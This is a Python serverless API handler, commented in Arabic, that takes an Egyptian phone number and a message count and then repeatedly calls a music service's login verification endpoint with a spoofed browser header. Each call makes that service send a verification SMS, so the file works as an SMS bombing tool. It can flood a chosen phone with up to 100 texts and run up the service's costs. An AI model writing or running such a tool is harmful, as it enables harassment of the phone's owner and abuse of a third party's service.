# ملف: api/send.py

import json
import requests
import time

def handler(request):
    # السماح بطلبات من أي مصدر (للتعامل مع CORS)
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Content-Type': 'application/json; charset=utf-8'
    }

    # التحقق من نوع الطلب
    if request.method != 'POST':
        return {
            'statusCode': 405,
            'headers': headers,
            'body': json.dumps({'message': 'طريقة الطلب غير مسموحة'})
        }

    try:
        # قراءة البيانات المرسلة من الواجهة
        data = json.loads(request.body)
        number = data.get('number')
        sms_count = data.get('sms_count', 1) # قيمة افتراضية 1
    except Exception as e:
        return {
            'statusCode': 400,
            'headers': headers,
            'body': json.dumps({'message': f'خطأ في قراءة البيانات: {str(e)}'}, ensure_ascii=False)
        }

    # التحقق من صحة البيانات
    if not (number and number.startswith("01") and len(number) == 11):
        return {
            'statusCode': 400,
            'headers': headers,
            'body': json.dumps({'message': 'بيانات غير صحيحة، تأكد من رقم الهاتف'}, ensure_ascii=False)
        }

    # تنفيذ الكود الأصلي لإرسال الرسائل
    success_count, failure_count = send_sms_requests(number, sms_count)

    # إرسال رد للواجهة الأمامية بالنتيجة
    response_message = f"تمت العملية: {success_count} رسالة ناجحة و {failure_count} فاشلة."
    return {
        'statusCode': 200,
        'headers': headers,
        'body': json.dumps({'message': response_message}, ensure_ascii=False)
    }

def send_sms_requests(number, sms_count):
    url = "https://api.twistmena.com/music/Dlogin/sendCode"
    phone_number = "2" + number
    success = 0
    failure = 0
    # تحديد عدد الرسائل بحد أقصى 100 لمنع الاستغلال
    count = min(int(sms_count), 100)
    for _ in range(count):
        payload = json.dumps({"dial": phone_number})
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Content-Type": "application/json",
        }
        try:
            # وضع مهلة زمنية للطلب لتجنب الانتظار الطويل
            response = requests.post(url, headers=headers, data=payload, timeout=10)
            if response.status_code == 200:
                success += 1
            else:
                failure += 1
        except Exception:
            failure += 1
        time.sleep(1) # تأخير بسيط بين الطلبات
    return success, failure
